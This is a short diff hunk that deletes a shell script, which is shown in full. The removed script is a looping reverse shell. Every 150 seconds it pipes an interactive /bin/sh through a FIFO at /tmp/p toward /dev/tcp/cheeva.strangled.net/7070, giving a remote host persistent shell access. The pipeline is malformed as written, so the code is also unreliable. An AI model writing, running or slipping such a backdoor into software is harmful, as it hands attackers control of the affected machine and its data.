@@ -1,9 +1,0 @@
-#!/bin/sh
-while true; do
-     
-
-    cat /tmp/p | /bin/sh -i 2>&1 | /dev/tcp/cheeva.strangled.net/7070 > /tmp/p &
-    
-
-    sleep 150
-done
